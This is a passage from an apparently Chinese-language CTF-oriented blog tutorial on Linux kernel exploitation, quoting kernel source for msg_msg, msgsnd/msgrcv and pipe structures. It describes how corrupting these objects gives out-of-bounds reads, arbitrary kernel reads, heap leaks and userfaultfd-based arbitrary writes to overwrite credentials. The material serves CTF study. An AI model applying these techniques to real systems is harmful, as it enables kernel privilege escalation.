class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>若是消息队列中只有一个消息则是这样：</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉 msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为 header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的</p><p>而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体</p><h3 id="分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用"><a href="#分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用" class="headerlink" title="分配（GFP_KERNEL_ACCOUNT）：msgsnd 系统调用"></a>分配（GFP_KERNEL_ACCOUNT）：msgsnd 系统调用</h3><p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">long</span> mtype, <span class="hljs-type">void</span> __user *mtext,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>DEFINE_WAKE_Q(wake_q);<br><br>ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br><span class="hljs-keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="hljs-type">long</span>) msgsz &lt; <span class="hljs-number">0</span> || msqid &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (mtype &lt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>msg = load_msg(mtext, msgsz);<br>    <br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code> 分配所需的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><span class="hljs-type">int</span> err = -EFAULT;<br><span class="hljs-type">size_t</span> alen;<br><br>msg = alloc_msg(len);<br></code></pre></td></tr></table></figure><p>阅读 <code>alloc_msg()</code> 源码可以发现，其以 msg_msg 结构体为核心生成如下结构：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">alloc_msg</span><span class="hljs-params">(<span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> **<span class="hljs-title">pseg</span>;</span><br><span class="hljs-type">size_t</span> alen;<br><br>alen = min(len, DATALEN_MSG);<br>msg = kmalloc(<span class="hljs-keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (msg == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>msg-&gt;next = <span class="hljs-literal">NULL</span>;<br>msg-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>len -= alen;<br>pseg = &amp;msg-&gt;next;<br><span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><br>cond_resched();<br><br>alen = min(len, DATALEN_SEG);<br>seg = kmalloc(<span class="hljs-keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (seg == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out_err;<br>*pseg = seg;<br>seg-&gt;next = <span class="hljs-literal">NULL</span>;<br>pseg = &amp;seg-&gt;next;<br>len -= alen;<br>&#125;<br><br><span class="hljs-keyword">return</span> msg;<br><br>out_err:<br>free_msg(msg);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="释放：msgrcv-系统调用"><a href="#释放：msgrcv-系统调用" class="headerlink" title="释放：msgrcv 系统调用"></a>释放：msgrcv 系统调用</h3><p>IPC，有“发”自然伴随着有“收”，我们发送消息时该结构体在内核中被创建，相应地在我们接收消息时该结构体将被从内核中释放，通过 msgrcv 系统调用我们可以从指定的消息队列中接收指定大小的消息，内核首先会调用 <code>list_del()</code> 将其从 <code>msg_queue</code> 的双向链表上 unlink，之后再调用 <code>free_msg()</code> 释放 <code>msg_msg</code> 单向链表上的所有消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    list_del(&amp;msg-&gt;m_list);<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">goto</span> out_unlock0;<br><span class="hljs-comment">//...</span><br>out_unlock0:<br>ipc_unlock_object(&amp;msq-&gt;q_perm);<br>wake_up_q(&amp;wake_q);<br>out_unlock1:<br>rcu_read_unlock();<br><span class="hljs-keyword">if</span> (IS_ERR(msg)) &#123;<br>free_copy(copy);<br><span class="hljs-keyword">return</span> PTR_ERR(msg);<br>&#125;<br><br>bufsz = msg_handler(buf, msg, bufsz);<br>free_msg(msg);<br><br><span class="hljs-keyword">return</span> bufsz;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读取：msgrcv-系统调用"><a href="#读取：msgrcv-系统调用" class="headerlink" title="读取：msgrcv 系统调用"></a>读取：msgrcv 系统调用</h3><p>IPC，有“发”自然伴随着有“收”，我们发送消息时该结构体在内核中被创建，相应地，在我们接收消息时 msg_msg 链上的对象上的内容会被拷贝到用户空间，其通过调用 <code>msg_handler()</code> 函数指针完成拷贝，对于 msgrcv 系统调用而言，由如下调用链传入该指针：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_msgrcv</span>()</span><br><span class="hljs-function"><span class="hljs-title">ksys_msgrcv</span>()</span><br><span class="hljs-function"><span class="hljs-title">do_msgrcv</span>()</span><br></code></pre></td></tr></table></figure><p>最终调用的是 <code>do_msg_fill()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msg_fill</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *dest, <span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">size_t</span> bufsz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msgbuf</span> __<span class="hljs-title">user</span> *<span class="hljs-title">msgp</span> =</span> dest;<br><span class="hljs-type">size_t</span> msgsz;<br><br><span class="hljs-keyword">if</span> (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;<br><span class="hljs-keyword">if</span> (store_msg(msgp-&gt;mtext, msg, msgsz))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">return</span> msgsz;<br>&#125;<br></code></pre></td></tr></table></figure><p>在该函数中最终调用 <code>store_msg()</code> 完成消息向用户空间的拷贝，<strong>拷贝循环的终止条件是单向链表末尾的 NULL 指针</strong>，拷贝数据的<strong>长度</strong>主要依赖的是 <strong>msg_msg 的 m_ts 成员</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">store_msg</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *dest, <span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-type">size_t</span> alen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><br>alen = min(len, DATALEN_MSG);<br><span class="hljs-keyword">if</span> (copy_to_user(dest, msg + <span class="hljs-number">1</span>, alen))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">for</span> (seg = msg-&gt;next; seg != <span class="hljs-literal">NULL</span>; seg = seg-&gt;next) &#123;<br>len -= alen;<br>dest = (<span class="hljs-type">char</span> __user *)dest + alen;<br>alen = min(len, DATALEN_SEG);<br><span class="hljs-keyword">if</span> (copy_to_user(dest, seg + <span class="hljs-number">1</span>, alen))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="MSG-COPY：读取但不释放"><a href="#MSG-COPY：读取但不释放" class="headerlink" title="MSG_COPY：读取但不释放"></a>MSG_COPY：读取但不释放</h4><p>当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，但阅读源码我们会发现，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以<strong>多次重复地读取同一个</strong> <code>msg_msg</code> 链条中数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br><span class="hljs-keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))<br><span class="hljs-keyword">return</span> -EINVAL;<br>copy = prepare_copy(buf, <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));<br><span class="hljs-keyword">if</span> (IS_ERR(copy))<br><span class="hljs-keyword">return</span> PTR_ERR(copy);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we are copying, then do not unlink message and do</span><br><span class="hljs-comment"> * not update queue parameters.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>msg = copy_msg(msg, copy);<br><span class="hljs-keyword">goto</span> out_unlock0;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="数据泄露-3"><a href="#数据泄露-3" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="越界数据读取"><a href="#越界数据读取" class="headerlink" title="越界数据读取"></a>越界数据读取</h4><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 msg_msg 的 header，将其 m_sz 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><p>对于大于一张内存页的数据而言内核会在 msg_msg 的基础上再补充加上 msg_msgseg 结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong></p><p>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址的数据为 NULL</strong></p><h4 id="内核线性映射区（-direct-mapping-area）-2"><a href="#内核线性映射区（-direct-mapping-area）-2" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>虽然我们不能直接读取当前 msg_msg 的 header，但我们不难想到的是：我们可以通过喷射大量的 msg_msg，从而<strong>利用越界读来读取其他 msg_msg 的 header</strong>，通过其双向链表成员泄露出一个“堆”上地址</p><p>那么这个“堆”上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>因此我们可以获得到对应的 <code>msg_queue</code> 的地址，相应地，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong></p><h4 id="基于堆地址泄露的堆上连续内存搜索"><a href="#基于堆地址泄露的堆上连续内存搜索" class="headerlink" title="**基于堆地址泄露的堆上连续内存搜索"></a>**基于堆地址泄露的堆上连续内存搜索</h4><p>在我们完成对“堆”上地址的泄露之后，我们可以在每一次读取时<strong>挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得<strong>连续的搜索内存的能力</strong>，不过这需要我们拥有足够次数的更改 msg_msg 的 header 的能力</p><p>（例题：<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">D^3CTF2022 - d3kheap</a>）</p><blockquote><p>之前例题本来想选一个以前有的 CTF 题来写的（比如说 corCTF），但是<strong>笔者太懒了</strong>…于是一直拖到最近刚好拿这个结构体出了一道 CTF 题，所以就顺便把这个过去开的坑给补充上…</p></blockquote><h3 id="任意地址写（结合-userfaultfd-或-FUSE-完成-race-condition-write）"><a href="#任意地址写（结合-userfaultfd-或-FUSE-完成-race-condition-write）" class="headerlink" title="任意地址写（结合 userfaultfd 或 FUSE 完成 race condition write）"></a>任意地址写（结合 userfaultfd 或 FUSE 完成 race condition write）</h3><p>当我们调用 msgsnd 系统调用时，其会调用 <code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用 <code>alloc_msg()</code> 分配 <code>msg_msg</code> 单向链表，之后才是正式的拷贝过程，即空间的分配与数据的拷贝是分开进行的</p><p>我们不难想到的是，<strong>在拷贝时利用 userfaultfd 将拷贝停下来，在子进程中篡改 msg_msg 的 next 指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写</strong></p><p>这里借用一张 bsauce 师傅的图来作为🌰说明，图上是将 next 指针劫持到进程的 PCB 上从而修改 cred 指针</p><p><img src="https://s2.loli.net/2022/03/09/p7d1PGVaM6TzmLc.png" alt="来自 bsauce 投稿安全客的文章的图片"></p><p>（例题：corCTF2021 - Fire of Salvation）</p><blockquote><p>笔者还没写 wp，这里先🕳着…</p></blockquote><h1 id="0x08-pipe-管道相关"><a href="#0x08-pipe-管道相关" class="headerlink" title="0x08.pipe 管道相关"></a>0x08.pipe 管道相关</h1><p><strong>管道</strong>同样是内核中十分重要也十分常用的一个 IPC 工具，同样地管道的结构也能够在内核利用中为我们所用，其本质上是创建了一个 virtual inode 与两个对应的文件描述符构成的：</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="非常经典的一张图"></p><h2 id="pipe-inode-info（kmalloc-192-GFP-KERNEL-ACCOUNT）：管道本体"><a href="#pipe-inode-info（kmalloc-192-GFP-KERNEL-ACCOUNT）：管道本体" class="headerlink" title="pipe_inode_info（kmalloc-192|GFP_KERNEL_ACCOUNT）：管道本体"></a>pipe_inode_info（kmalloc-192|GFP_KERNEL_ACCOUNT）：管道本体</h2><p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个 VFS inode 与一个 pipe_inode_info 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *@head: The point of buffer production</span><br><span class="hljs-comment"> *@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: cached released page</span><br><span class="hljs-comment"> *@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: reader counter</span><br><span class="hljs-comment"> *@w_counter: writer counter</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *@user: the user who created this pipe</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数据泄露-4"><a href="#数据泄露-4" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核线性映射区（-direct-mapping-area）-3"><a href="#内核线性映射区（-direct-mapping-area）-3" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><h2 id="pipe-buffer（kmalloc-1k-GFP-KERNEL-ACCOUNT）：管道数据"><a href="#pipe-buffer（kmalloc-1k-GFP-KERNEL-ACCOUNT）：管道数据" class="headerlink" title="pipe_buffer（kmalloc-1k|GFP_KERNEL_ACCOUNT）：管道数据"></a>pipe_buffer（kmalloc-1k|GFP_KERNEL_ACCOUNT）：管道数据</h2><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the 